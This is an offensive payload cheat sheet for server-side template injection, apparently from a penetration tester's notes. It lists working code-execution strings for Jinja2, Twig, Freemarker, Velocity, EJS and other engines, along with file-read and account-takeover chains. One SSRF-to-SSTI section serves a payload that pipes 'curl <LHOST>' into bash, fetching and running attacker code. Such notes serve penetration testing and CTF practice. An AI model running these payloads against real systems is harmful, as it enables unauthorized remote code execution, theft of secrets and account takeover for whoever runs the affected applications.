---
title: "Payloads: SSTI"
type: payloads
tags: [payloads, ssti, rce, web]
sources: []
date_created: 2026-06-05
date_updated: 2026-11-09
---

# Payloads: SSTI

Detect engine, then escalate to RCE. See [[techniques/web/ssti]].

## Detect + fingerprint
```
${7*7}  {{7*7}}  <%=7*7%>  #{7*7}  ${{7*7}}  {7*7}
{{7*'7'}}   -> 49 (Jinja/Twig) vs 7777777 (Twig) vs error
```

## Jinja2 / Flask (Python) RCE
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

## SSTI via a server-side URL fetcher (SSRF -> SSTI)
When an app fetches a user-supplied URL and renders the RESPONSE through a template (`render_template_string(fetched_content)`: "website preview", "screenshot", "link unfurl", "import from URL"), the SSTI is in the FETCHED CONTENT, not in any request parameter. Host a template and point the fetcher at it:
```
# served at http://<LHOST>/t  (the "website" the app fetches + renders)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl <LHOST>|bash').read() }}
# trigger:
curl -s -d 'website_url=http://<LHOST>/t' http://<internal>:5000/
```
The same param usually also supports `file://` (SSRF to host LFI): `website_url=file:///home/<user>/app/app.py` reads the app source and confirms the `render_template_string` sink. PycURL in the `User-Agent` is the tell. Seen on THM Contrabando (internal Flask fetcher on `172.18.0.1:5000`).

## Twig (PHP)
```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
```

## Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

## Velocity (Java)
```
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",...) 
```

## Others
```
ERB (Ruby):   <%= `id` %>
Smarty (PHP): {system('id')}
Handlebars:   constructor lookup chain (prototype)
```

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[ssi-injection]]

## EJS (Node.js)

`<%= 7*7 %>` rendering `49` in a Node/Express app is EJS (syntax shared with Ruby ERB; tell them apart from the stack, `X-Powered-By: Express` or a Node error page). EJS evaluates real JavaScript with `process` reachable:

```html
<%= process.mainModule.require("child_process").execSync("id; hostname").toString() %>
```

Gotchas when shelling through it: `execSync` throws on any nonzero exit and the throw swallows ALL output, so end fallible commands with `; true`; escape shell parens as `\\(` inside the JS string; avoid single quotes; read output from the rendered template block, not the echoed source (the literal template still shows in the page).

<!-- promoted-slug: ejs-node-ssti-rce -->


## NEW 2025-2026: two-stage stored + no-RCE ATO

- **Two-stage stored SSTI** (StyleSmuggler/Magento class): poison a
  report/log/session/header/custom-option record; executes when a mail
  template or GraphQL `styles` read renders it later. Moving session storage
  does not fix it (any writable source replaces it). Neither stage reflects;
  OOB/DNS is the proof channel. Probe write and render stages separately.
- **Context dump -> ATO** (Twig): `{{ _context|json_encode }}` then
  `{{ users[0].reset_token }}`; chain forgot-password -> render the target
  record through the stored template -> redeem = ATO without mailbox access.
  Sandbox = allow/deny policy, NOT data safety.
- **FreeMarker `?api`** (bypasses ALLOWS_NOTHING_RESOLVER):
  `?api.class.getResourceAsStream` byte read; `getResource("/").toURI()?api.create("file:///etc/passwd")`;
  RCE via public static Gson field ->
  `gson?api.fromJson("{}", loadClass("freemarker.template.utility.Execute"))`.
- **Phoenix LiveView HEEx**: `psb-assign` -> attribute interpolated into
  generated HEEx -> compiled+evaluated:
  `foo" pwned={elem(System.cmd("sh",["-c","id"]), 0)} a="`.

Full ladder: `skills/exploit/hunt/hunt-injection/references/bypass-arsenal.md`.
